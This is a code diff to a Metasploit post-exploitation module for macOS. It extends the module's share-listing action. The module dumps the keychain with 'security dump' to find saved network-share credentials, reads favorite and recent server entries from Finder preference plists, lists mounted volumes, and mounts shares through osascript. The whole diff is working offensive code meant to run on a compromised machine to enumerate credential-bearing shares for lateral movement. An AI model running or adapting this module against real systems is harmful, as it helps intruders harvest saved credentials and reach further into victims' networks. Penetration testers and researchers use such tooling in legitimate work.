@@ -37,6 +37,8 @@ class Metasploit3 < Msf::Post
         OptString.new('VOLUME', [true, 'Name of network share volume. `set ACTION LIST` to get a list.', 'localhost']),
         OptString.new('SECURITY_PATH', [true, 'Path to the security executable.', '/usr/bin/security']),
         OptString.new('OSASCRIPT_PATH', [true, 'Path to the osascript executable.', '/usr/bin/osascript']),
+        OptString.new('SIDEBAR_PLIST_PATH', [true, 'Path to the finder sidebar plist.', '~/Library/Preferences/com.apple.sidebarlists.plist']),
+        OptString.new('RECENT_PLIST_PATH', [true, 'Path to the finder recent plist.', '~/Library/Preferences/com.apple.recentitems.plist']),
         OptString.new('PROTOCOL', [true, 'Network share protocol. `set ACTION LIST` to get a list.', 'smb'])
       ], self.class)
 
@@ -45,24 +47,59 @@ class Metasploit3 < Msf::Post
   def run
     fail_with("Invalid action") if action.nil?
 
+    username = cmd_exec('whoami')
+    security_path = datastore['SECURITY_PATH'].shellescape
+    sidebar_plist_path = datastore['SIDEBAR_PLIST_PATH'].gsub(/^\~/, "/Users/#{username}").shellescape
+    recent_plist_path = datastore['RECENT_PLIST_PATH'].gsub(/^\~/, "/Users/#{username}").shellescape
+
     if action.name == 'LIST'
-      saved_shares = get_share_list
-      if saved_shares.length == 0
-        print_status("No Network Share credentials were found in the keyrings")
-      else
-        print_status("Network shares saved in keyrings:")
-        print_status("Protocol\tShare Name")
-        saved_shares.each do |line|
-          print_good(line)
+      if file?(security_path)
+        saved_shares = get_keyring_shares(security_path)
+        if saved_shares.length == 0
+          print_status("No Network Share credentials were found in the keyrings")
+        else
+          print_status("Network shares saved in keyrings:")
+          print_status("  Protocol\tShare Name")
+          saved_shares.each do |line|
+            print_good("  #{line}")
+          end
         end
+      else
+        print_error("Could not check keyring contents: Security binary not found.")
       end
-      mounted_shares = get_mounted_list
+      if file?(sidebar_plist_path)
+        favorite_shares = get_favorite_shares(sidebar_plist_path)
+        if favorite_shares.length == 0
+          print_status("No favorite shares were found")
+        else
+          print_status("Favorite shares (without stored credentials):")
+          favorite_shares.each do |line|
+            print_good("  #{line}")
+          end
+        end
+      else
+        print_error("Could not check sidebar favorites contents: Sidebar plist not found")
+      end
+      if file?(recent_plist_path)
+        recent_shares = get_recent_shares(recent_plist_path)
+        if recent_shares.length == 0
+          print_status("No recent shares were found")
+        else
+          print_status("Recent shares (without stored credentials):")
+          recent_shares.each do |line|
+            print_good("  #{line}")
+          end
+        end
+      else
+        print_error("Could not check recent favorites contents: Recent plist not found")
+      end
+      mounted_shares = get_mounted_volumes
       if mounted_shares.length == 0
         print_status("No volumes found in /Volumes")
       else
         print_status("Mounted Volumes:")
         mounted_shares.each do |line|
-          print_good(line)
+          print_good("  #{line}")
         end
       end
     elsif action.name == 'MOUNT'
@@ -72,15 +109,15 @@ class Metasploit3 < Msf::Post
     end
   end
 
-  def get_share_list
-    vprint_status(datastore['SECURITY_PATH'].shellescape + " dump")
-    data = cmd_exec(datastore['SECURITY_PATH'].shellescape + " dump")
+  def get_keyring_shares(security_path)
+    vprint_status("#{security_path} dump")
+    data = cmd_exec("#{security_path} dump")
     # Grep for desc srvr and ptcl
     tmp = []
     lines = data.lines
     lines.each do |line|
       line.strip!
-      unless line !~ /desc|srvr|ptcl/
+      if line =~ /desc|srvr|ptcl/
         tmp.push(line)
       end
     end
@@ -91,15 +128,79 @@ class Metasploit3 < Msf::Post
       if tmp[x] =~ /"desc"<blob>="Network Password"/ && x < tmp.length-3
         # Remove everything up to the double-quote after the equal sign,
         # and also the trailing double-quote
-        protocol = tmp[x+1].gsub(/^.*\=\"/, '').gsub(/\w*\"\w*$/, '')
-        server = tmp[x+2].gsub(/^.*\=\"/, '').gsub(/\"\w*$/, '')
-        list.push(protocol + "\t" + server)
+        if tmp[x+1] =~ /^.*\=\"(.*)\w*\"\w*$/
+          protocol = $1
+          if protocol =~ /smb|nfs|cifs|ftp|afp/ && tmp[x+2] =~ /^.*\=\"(.*)\"\w*$/
+            server = $1
+            list.push(protocol + "\t" + server)
+          end
+        end
       end
     end
     return list.sort
   end
 
-  def get_mounted_list
+  def get_favorite_shares(sidebar_plist_path)
+    vprint_status("defaults read #{sidebar_plist_path} favoriteservers")
+    data = cmd_exec("defaults read #{sidebar_plist_path} favoriteservers")
+
+    # Grep for URL
+    list = []
+    lines = data.lines
+    lines.each do |line|
+      line.strip!
+      if line =~ /^URL = \"(.*)\"\;$/
+        list.push($1)
+      end
+    end
+
+    vprint_status("defaults read #{sidebar_plist_path} favorites")
+    data = cmd_exec("defaults read #{sidebar_plist_path} favorites")
+    # Grep for EntryType and Name
+    tmp = []
+    lines = data.lines
+    lines.each do |line|
+      line.strip!
+      if line =~ /EntryType|Name/
+        tmp.push(line)
+      end
+    end
+
+    # Go through the list, find the rows with EntryType 8 and their
+    # corresponding name
+    for x in 0..tmp.length-1
+      if tmp[x] =~ /EntryType = 8;/ && x < tmp.length-2
+        if tmp[x+1] =~ /^Name \= \"(.*)\"\;$/
+          name = $1
+          list.push(name) unless list.include?(name)
+        elsif tmp[x+1] =~ /^Name \= (.*)\;$/
+          name = $1
+          list.push(name) unless list.include?(name)
+        end
+      end
+    end
+    return list.sort
+  end
+
+  def get_recent_shares(recent_plist_path)
+    vprint_status("defaults read #{recent_plist_path} RecentServers")
+    data = cmd_exec("defaults read #{recent_plist_path} RecentServers")
+
+    # Grep for Name
+    list = []
+    lines = data.lines
+    lines.each do |line|
+      line.strip!
+      if line =~ /^Name = \"(.*)\"\;$/
+        list.push($1) unless list.include?($1)
+      elsif line =~ /^Name = (.*)\;$/
+        list.push($1) unless list.include?($1)
+      end
+    end
+    return list.sort
+  end
+
+  def get_mounted_volumes
     vprint_status("ls /Volumes")
     data = cmd_exec("ls /Volumes")
     list = []
@@ -112,10 +213,10 @@ class Metasploit3 < Msf::Post
   end
 
   def mount
-    share_name = datastore['VOLUME']
-    protocol = datastore['PROTOCOL']
+    share_name = datastore['VOLUME'].shellescape
+    protocol = datastore['PROTOCOL'].shellescape
     print_status("Connecting to #{protocol}://#{share_name}")
-    cmd = "osascript -e 'tell app \"finder\" to mount volume \"#{protocol}://#{share_name}\"'"
+    cmd = "osascript -e 'tell app \"finder\" to mount volume #{protocol}://#{share_name}'"
     vprint_status(cmd)
     cmd_exec(cmd)
   end
